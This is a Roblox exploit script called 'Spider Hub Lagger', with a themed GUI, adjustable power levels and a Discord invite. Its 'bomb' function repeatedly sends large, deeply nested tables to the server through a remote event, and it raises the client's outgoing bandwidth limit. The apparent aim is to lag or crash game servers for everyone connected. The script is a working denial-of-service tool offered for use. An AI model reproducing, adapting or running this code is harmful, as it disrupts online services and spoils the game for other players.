--// SPIDER HUB LAGGER

--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local ConfigFile = "KillHubConfig.json"

-- ⚙️ POWERS
local NIVELES = {
    low   = { poder = 18, texto = "SPEED RECOMMENDED 50-25" },
    mid   = { poder = 27, texto = "SPEED RECOMMENDED 42-20" },
    high  = { poder = 32, texto = "SPEED RECOMMENDED 40-17" },
    ultra = { poder = 80, texto = "⚠️ EXTREME POWER - USE WITH CAUTION" }
}

local COLORES = {
    low   = Color3.fromRGB(150, 150, 160),
    mid   = Color3.fromRGB(220, 180, 60),
    high  = Color3.fromRGB(220, 60, 60),
    ultra = Color3.fromRGB(160, 20, 20)
}

local keybind = Enum.KeyCode.M
local listeningForInput = false
local laggerActive = false
local lagThread = nil
local nivelActual = "low"
local ventanaBloqueada = false

-- 🎨 SPIDER THEME PALETTE
local UI = {
    MainBg       = Color3.fromRGB(10, 8, 10),
    Accent       = Color3.fromRGB(200, 30, 30),
    AccentDark   = Color3.fromRGB(130, 20, 20),
    AccentGlow   = Color3.fromRGB(255, 80, 80),
    TextLight    = Color3.fromRGB(235, 235, 245),
    TextDim      = Color3.fromRGB(170, 170, 180),
    ButtonInact  = Color3.fromRGB(30, 28, 30),
    ButtonHover  = Color3.fromRGB(55, 50, 55),
    Font         = Enum.Font.GothamBlack,
    BorderColor  = Color3.fromRGB(100, 30, 30),
}

-- 💾 CONFIG
local function SaveConfig()
    local data = { Keybind = keybind.Name, Nivel = nivelActual, Bloqueado = ventanaBloqueada }
    pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end)
end
local function LoadConfig()
    if pcall(isfile, ConfigFile) and isfile(ConfigFile) then
        pcall(function()
            local data = HttpService:JSONDecode(readfile(ConfigFile))
            keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
            nivelActual = data.Nivel or "low"
            ventanaBloqueada = data.Bloqueado or false
        end)
    end
end
LoadConfig()

-- ⚠️ LAG ENGINE
local function bomb(poder)
    local main, spam = {}, {{}}
    local z = spam[1]
    for i = 1, 25 do local t = {} table.insert(z, t) z = t end
    local max = math.min(12000, poder * 50)
    for i = 1, max do table.insert(main, spam) end
    pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

-- 🧩 ELEMENTS
local toggleBall, toggleContainer, btnLow, btnMid, btnHigh, btnUltra, lockButton
local titleLabel, keybindButton, toggleClick, shadowLabel
local infoLabel, discordLabel

-- Update functions
local function actualizarBotonesNivel()
    local function setButton(btn, isActive, activeColor, activeTextColor)
        if isActive then
            btn.BackgroundColor3 = activeColor
            btn.TextColor3 = activeTextColor
            btn.BorderSizePixel = 2
            btn.BorderColor3 = UI.AccentGlow
            -- Add a glow effect via a second border (we'll do a separate frame later)
        else
            btn.BackgroundColor3 = UI.ButtonInact
            btn.TextColor3 = UI.TextDim
            btn.BorderSizePixel = 1
            btn.BorderColor3 = UI.BorderColor
        end
    end
    setButton(btnLow,  nivelActual == "low",  COLORES.low,  Color3.fromRGB(0,0,0))
    setButton(btnMid,  nivelActual == "mid",  COLORES.mid,  Color3.fromRGB(0,0,0))
    setButton(btnHigh, nivelActual == "high", COLORES.high, Color3.fromRGB(255,255,255))
    setButton(btnUltra,nivelActual == "ultra",COLORES.ultra,Color3.fromRGB(255,255,255))
    if infoLabel then
        infoLabel.Text = NIVELES[nivelActual].texto
        infoLabel.TextColor3 = COLORES[nivelActual]
    end
end

local function actualizarSwitch()
    if toggleContainer then
        toggleContainer.BackgroundColor3 = UI.ButtonInact
    end
    if toggleBall then
        toggleBall.BackgroundColor3 = UI.Accent
        if laggerActive then
            toggleBall.Position = UDim2.new(1, -24, 0.5, -11)
            toggleBall.BackgroundColor3 = Color3.fromRGB(0, 200, 0)  -- green when ON
        else
            toggleBall.Position = UDim2.new(0, 4, 0.5, -11)
            toggleBall.BackgroundColor3 = UI.AccentDark  -- dark red when OFF
        end
    end
    if toggleClick then
        toggleClick.Text = laggerActive and "ON" or "OFF"
        toggleClick.TextColor3 = laggerActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    end
end

local function actualizarCandado()
    lockButton.Text = ventanaBloqueada and "🔒" or "🔓"
    lockButton.TextColor3 = ventanaBloqueada and UI.TextLight or UI.TextDim
end

local function actualizarKeybindButton()
    if keybindButton then
        local display = keybind.Name:gsub("Button", "")
        keybindButton.Text = "[" .. display .. "]"
    end
end

local function toggleLagger()
    laggerActive = not laggerActive
    local targetPos = laggerActive and UDim2.new(1, -24, 0.5, -11) or UDim2.new(0, 4, 0.5, -11)
    TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        Position = targetPos
    }):Play()
    toggleClick.Text = laggerActive and "ON" or "OFF"
    toggleClick.TextColor3 = laggerActive and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)

    if laggerActive then
        if lagThread then task.cancel(lagThread) end
        lagThread = task.spawn(function()
            while laggerActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                bomb(NIVELES[nivelActual].poder)
                task.wait(0.18)
            end
        end)
    else
        if lagThread then task.cancel(lagThread); lagThread = nil end
    end
end

-- 🖼️ CREATE UI
if CoreGui:FindFirstChild("SpiderHub_UI") then CoreGui.SpiderHub_UI:Destroy() end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "SpiderHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

-- Main panel
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = UI.MainBg
mainFrame.BackgroundTransparency = 0
mainFrame.BorderSizePixel = 2
mainFrame.BorderColor3 = UI.AccentDark
mainFrame.Size = UDim2.new(0, 340, 0, 130)
mainFrame.Position = UDim2.new(0.15, 0, 0.5, -65)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
local corner = Instance.new("UICorner", mainFrame)
corner.CornerRadius = UDim.new(0, 12)

-- 🌟 Pulsing red glow border
local glowBorder = Instance.new("Frame", mainFrame)
glowBorder.Size = UDim2.new(1, -4, 1, -4)
glowBorder.Position = UDim2.new(0, 2, 0, 2)
glowBorder.BackgroundTransparency = 1
glowBorder.BorderSizePixel = 2
glowBorder.BorderColor3 = UI.AccentGlow
glowBorder.ZIndex = 1
local cornerGlow = Instance.new("UICorner", glowBorder)
cornerGlow.CornerRadius = UDim.new(0, 10)

-- Pulse animation
task.spawn(function()
    while true do
        for t = 0, 1, 0.02 do
            local brightness = 0.5 + 0.5 * math.sin(t * math.pi * 2)
            local r = 200 + 55 * brightness
            glowBorder.BorderColor3 = Color3.fromRGB(r, 30, 30)
            task.wait(0.02)
        end
    end
end)

-- 🕸️ Spider web pattern overlay
local webPattern = Instance.new("ImageLabel", mainFrame)
webPattern.Size = UDim2.new(1, 0, 1, 0)
webPattern.BackgroundTransparency = 1
webPattern.Image = "rbxassetid://1033390675"
webPattern.ImageTransparency = 0.7
webPattern.ScaleType = Enum.ScaleType.Tile
webPattern.TileSize = UDim2.new(0, 200, 0, 200)
webPattern.ZIndex = 0

-- Your custom background image
local bgImage = Instance.new("ImageLabel", mainFrame)
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.BackgroundTransparency = 1
bgImage.Image = "rbxassetid://86681528969160"
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 0

-- Dark overlay with gradient
local overlay = Instance.new("Frame", mainFrame)
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
overlay.BackgroundTransparency = 0.5
overlay.ZIndex = 1
local grad = Instance.new("UIGradient", overlay)
grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(15, 5, 8)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 3, 5))
})
grad.Rotation = 45

-- ═══════════════════════════════════════════
-- TITLE
-- ═══════════════════════════════════════════
local titleFrame = Instance.new("Frame", mainFrame)
titleFrame.Size = UDim2.new(1, 0, 0, 26)
titleFrame.Position = UDim2.new(0, 0, 0, 2)
titleFrame.BackgroundTransparency = 1
titleFrame.ZIndex = 2

local titleLabel = Instance.new("TextLabel", titleFrame)
titleLabel.Size = UDim2.new(0, 240, 1, 0)
titleLabel.Position = UDim2.new(0, 6, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = UI.Font
titleLabel.Text = "SPIDER HUB LAGGER"
titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
titleLabel.TextSize = 15
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.TextYAlignment = Enum.TextYAlignment.Center
titleLabel.ZIndex = 3

-- Glow duplicate
local glowTitle = titleLabel:Clone()
glowTitle.TextColor3 = UI.AccentGlow
glowTitle.TextTransparency = 0.6
glowTitle.Position = UDim2.new(0, 7, 0, 1)
glowTitle.ZIndex = 2
glowTitle.Parent = titleFrame

-- ═══════════════════════════════════════════
-- KEYBIND & LOCK
-- ═══════════════════════════════════════════
keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.BackgroundColor3 = UI.ButtonInact
keybindButton.BackgroundTransparency = 0.2
keybindButton.Position = UDim2.new(1, -80, 0, 4)
keybindButton.Size = UDim2.new(0, 34, 0, 18)
keybindButton.Font = UI.Font
keybindButton.Text = "[M]"
keybindButton.TextColor3 = UI.TextLight
keybindButton.TextSize = 10
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 4
local kbCorner = Instance.new("UICorner", keybindButton)
kbCorner.CornerRadius = UDim.new(0, 6)
actualizarKeybindButton()

lockButton = Instance.new("TextButton", mainFrame)
lockButton.BackgroundColor3 = UI.ButtonInact
lockButton.BackgroundTransparency = 0.2
lockButton.Position = UDim2.new(1, -40, 0, 4)
lockButton.Size = UDim2.new(0, 30, 0, 18)
lockButton.Font = UI.Font
lockButton.TextSize = 14
lockButton.TextColor3 = UI.TextLight
lockButton.AutoButtonColor = false
lockButton.ZIndex = 4
local lockCorner = Instance.new("UICorner", lockButton)
lockCorner.CornerRadius = UDim.new(0, 6)
lockButton.MouseButton1Click:Connect(function()
    ventanaBloqueada = not ventanaBloqueada
    actualizarCandado()
    SaveConfig()
end)
actualizarCandado()

-- ═══════════════════════════════════════════
-- TOGGLE
-- ═══════════════════════════════════════════
toggleContainer = Instance.new("Frame", mainFrame)
toggleContainer.BackgroundColor3 = UI.ButtonInact
toggleContainer.Position = UDim2.new(0, 8, 0, 32)
toggleContainer.Size = UDim2.new(0, 64, 0, 24)
toggleContainer.ZIndex = 2
local tcCorner = Instance.new("UICorner", toggleContainer)
tcCorner.CornerRadius = UDim.new(1, 0)

toggleBall = Instance.new("Frame", toggleContainer)
toggleBall.BackgroundColor3 = UI.AccentDark
toggleBall.Size = UDim2.new(0, 20, 0, 20)
toggleBall.Position = UDim2.new(0, 2, 0.5, -10)
toggleBall.ZIndex = 2
local tbCorner = Instance.new("UICorner", toggleBall)
tbCorner.CornerRadius = UDim.new(1, 0)

-- Eye icon on toggle ball
local eyeIcon = Instance.new("TextLabel", toggleBall)
eyeIcon.Size = UDim2.new(1,0,1,0)
eyeIcon.BackgroundTransparency = 1
eyeIcon.Font = Enum.Font.Gotham
eyeIcon.Text = "🕸️"
eyeIcon.TextSize = 12
eyeIcon.TextColor3 = Color3.fromRGB(255,255,255)
eyeIcon.TextTransparency = 0.3
eyeIcon.TextXAlignment = Enum.TextXAlignment.Center
eyeIcon.TextYAlignment = Enum.TextYAlignment.Center
eyeIcon.ZIndex = 3

toggleClick = Instance.new("TextButton", toggleContainer)
toggleClick.BackgroundTransparency = 1
toggleClick.Size = UDim2.new(1,0,1,0)
toggleClick.ZIndex = 3
toggleClick.Font = UI.Font
toggleClick.Text = "OFF"
toggleClick.TextSize = 10
toggleClick.TextColor3 = Color3.fromRGB(255,0,0)
toggleClick.TextXAlignment = Enum.TextXAlignment.Center
toggleClick.TextYAlignment = Enum.TextYAlignment.Center
toggleClick.MouseButton1Click:Connect(toggleLagger)
toggleClick.AutoButtonColor = false

-- ═══════════════════════════════════════════
-- LEVEL BUTTONS
-- ═══════════════════════════════════════════
local btnY = 32
local btnW = 58
local btnH = 24
local espaciado = 5
local startX = 340 - 10 - (btnW * 4 + espaciado * 3)

local function createLevelButton(text, xPos)
    local btn = Instance.new("TextButton", mainFrame)
    btn.Size = UDim2.new(0, btnW, 0, btnH)
    btn.Position = UDim2.new(0, xPos, 0, btnY)
    btn.Font = UI.Font
    btn.Text = text
    btn.TextColor3 = UI.TextDim
    btn.TextSize = 10
    btn.AutoButtonColor = false
    btn.BackgroundColor3 = UI.ButtonInact
    btn.BorderSizePixel = 1
    btn.BorderColor3 = UI.BorderColor
    btn.ZIndex = 2
    local btnCorner = Instance.new("UICorner", btn)
    btnCorner.CornerRadius = UDim.new(1, 0)  -- pill shape
    -- Hover effect
    btn.MouseEnter:Connect(function()
        if btn.BackgroundColor3 == UI.ButtonInact then
            btn.BackgroundColor3 = UI.ButtonHover
        end
    end)
    btn.MouseLeave:Connect(function()
        if btn.BackgroundColor3 == UI.ButtonHover then
            btn.BackgroundColor3 = UI.ButtonInact
        end
    end)
    return btn
end

btnLow = createLevelButton("LOW", startX)
btnMid = createLevelButton("MID", startX + btnW + espaciado)
btnHigh = createLevelButton("HIGH", startX + (btnW + espaciado) * 2)
btnUltra = createLevelButton("ULTRA", startX + (btnW + espaciado) * 3)

btnLow.MouseButton1Click:Connect(function() nivelActual="low"; actualizarBotonesNivel(); SaveConfig() end)
btnMid.MouseButton1Click:Connect(function() nivelActual="mid"; actualizarBotonesNivel(); SaveConfig() end)
btnHigh.MouseButton1Click:Connect(function() nivelActual="high"; actualizarBotonesNivel(); SaveConfig() end)
btnUltra.MouseButton1Click:Connect(function() nivelActual="ultra"; actualizarBotonesNivel(); SaveConfig() end)

-- ═══════════════════════════════════════════
-- INFO & DISCORD SERVER
-- ═══════════════════════════════════════════
infoLabel = Instance.new("TextLabel", mainFrame)
infoLabel.BackgroundTransparency = 1
infoLabel.Position = UDim2.new(0, 8, 0, 60)
infoLabel.Size = UDim2.new(1, -16, 0, 16)
infoLabel.Font = UI.Font
infoLabel.Text = NIVELES.low.texto
infoLabel.TextColor3 = COLORES.low
infoLabel.TextSize = 9
infoLabel.TextXAlignment = Enum.TextXAlignment.Left
infoLabel.TextYAlignment = Enum.TextYAlignment.Top
infoLabel.ZIndex = 2

discordLabel = Instance.new("TextLabel", mainFrame)
discordLabel.BackgroundTransparency = 1
discordLabel.Position = UDim2.new(0, 8, 0, 80)
discordLabel.Size = UDim2.new(1, -16, 0, 14)
discordLabel.Font = Enum.Font.Gotham
discordLabel.Text = "discord.gg/AMUDzpSFUd"
discordLabel.TextColor3 = UI.TextDim
discordLabel.TextSize = 9
discordLabel.TextXAlignment = Enum.TextXAlignment.Left
discordLabel.TextYAlignment = Enum.TextYAlignment.Top
discordLabel.ZIndex = 2

-- ═══════════════════════════════════════════
-- KEY SELECTOR
-- ═══════════════════════════════════════════
keybindButton.MouseButton1Click:Connect(function()
    if listeningForInput then return end
    listeningForInput = true
    keybindButton.Text = "[?]"
    keybindButton.BackgroundColor3 = Color3.fromRGB(200,0,0)
    keybindButton.TextColor3 = Color3.fromRGB(255,255,255)
end)

local inputConnection
inputConnection = UserInputService.InputBegan:Connect(function(input, gp)
    if not listeningForInput then return end
    if gp then return end
    local newKey = nil
    if input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    elseif input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode ~= Enum.KeyCode.Unknown then
        newKey = input.KeyCode
    end
    if newKey then
        keybind = newKey
        actualizarKeybindButton()
        SaveConfig()
        listeningForInput = false
        keybindButton.BackgroundColor3 = UI.ButtonInact
        keybindButton.BackgroundTransparency = 0.2
        keybindButton.TextColor3 = UI.TextLight
    end
end)

-- ═══════════════════════════════════════════
-- INIT STATE
-- ═══════════════════════════════════════════
actualizarBotonesNivel()
actualizarSwitch()

-- ═══════════════════════════════════════════
-- DRAGGING UI LOGIC
-- ═══════════════════════════════════════════
local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
    if ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = true
        dragStart = input.Position
        startPos = mainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if not isDragging or ventanaBloqueada then return end
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
mainFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isDragging = false
    end
end)

-- 🎮 ACTIVATION
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == keybind or (input.UserInputType == Enum.UserInputType.Gamepad1 and input.KeyCode == keybind) then
        toggleLagger()
    end
end)